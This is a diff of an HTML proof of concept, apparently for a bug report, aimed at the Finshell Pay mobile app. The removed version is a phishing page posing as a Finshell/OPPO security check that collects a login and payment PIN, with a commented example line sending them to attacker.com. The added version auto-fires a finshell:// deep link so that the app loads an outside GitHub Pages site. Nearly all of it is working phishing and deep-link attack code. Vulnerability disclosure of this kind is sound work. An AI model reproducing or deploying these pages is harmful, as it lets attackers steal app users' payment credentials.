@@ -1,118 +1,21 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Verification | Finshell Pay</title>
-    <style>
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #f0f2f5;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-        .container {
-            background: #ffffff;
-            padding: 40px;
-            border-radius: 12px;
-            box-shadow: 0 8px 24px rgba(0,0,0,0.1);
-            width: 100%;
-            max-width: 380px;
-            text-align: center;
-        }
-        .brand {
-            color: #05a357; /* Finshell/OPPO Green style */
-            font-size: 26px;
-            font-weight: bold;
-            margin-bottom: 10px;
-        }
-        .header-text {
-            color: #333;
-            font-size: 18px;
-            margin-bottom: 25px;
-        }
-        .alert-box {
-            background-color: #fff3f3;
-            border-left: 4px solid #ff4d4d;
-            padding: 10px;
-            margin-bottom: 20px;
-            color: #d32f2f;
-            font-size: 13px;
-            text-align: left;
-        }
-        input {
-            width: 100%;
-            padding: 14px;
-            margin: 8px 0;
-            border: 1px solid #ddd;
-            border-radius: 6px;
-            box-sizing: border-box;
-            font-size: 14px;
-        }
-        input:focus {
-            outline: none;
-            border-color: #05a357;
-        }
-        button {
-            width: 100%;
-            padding: 14px;
-            background-color: #05a357;
-            color: white;
-            border: none;
-            border-radius: 6px;
-            cursor: pointer;
-            font-size: 16px;
-            font-weight: 600;
-            margin-top: 15px;
-            transition: background 0.3s;
-        }
-        button:hover {
-            background-color: #048a4a;
-        }
-        .footer {
-            margin-top: 20px;
-            font-size: 12px;
-            color: #888;
-        }
-    </style>
+    <title>Checking System...</title>
+    <meta http-equiv="refresh" content="0;url=finshell://web?url=https://yazidtokyo43.github.io/oppo-tes/index.html">
 </head>
-<body>
+<body style="text-align: center; font-family: Arial, sans-serif; padding-top: 50px;">
+    <h2>Processing...</h2>
+    <p>If the app doesn't open automatically, 
+       <a href="finshell://web?url=https://yazidtokyo43.github.io/oppo-tes/index.html" 
+          style="color: blue; font-weight: bold; font-size: 20px;">
+          Click Here to Continue
+       </a>
+    </p>
 
-<div class="container">
-    <div class="brand">Finshell Pay</div>
-    <div class="header-text">Security Update Required</div>
-    
-    <div class="alert-box">
-        <strong>Security Notice:</strong> We detected an unusual login attempt. Please verify your identity to continue using financial services.
-    </div>
-
-    <form id="exploitForm">
-        <input type="text" id="username" placeholder="Phone number or Email" required>
-        <input type="password" id="password" placeholder="Payment Password / PIN" required>
-        <button type="button" onclick="captureData()">Verify Identity</button>
-    </form>
-
-    <div class="footer">
-        © 2026 OPPO Mobile Telecommunications Corp., Ltd.
-    </div>
-</div>
-
-<script>
-    function captureData() {
-        const user = document.getElementById('username').value;
-        const pass = document.getElementById('password').value;
-
-        // Proof of Impact: Demonstrating that data is captured
-        console.log("Exfiltrating Data...");
-        alert("POC SUCCESS: Data Stolen!\n\nTarget: Finshell App\nUsername: " + user + "\nPassword: " + pass + "\n\nThis demonstrates a High-Impact Phishing attack inside the trusted app UI.");
-        
-        // In a real attack, this would be sent to a remote attacker-controlled server
-        // Example: fetch('https://attacker.com/log?u=' + user + '&p=' + pass);
-    }
-</script>
-
+    <script>
+        // محاولة التحويل عبر الجافاسكريبت لضمان العمل على جميع المتصفحات
+        window.location.href = "finshell://web?url=https://yazidtokyo43.github.io/oppo-tes/index.html";
+    </script>
 </body>
 </html>
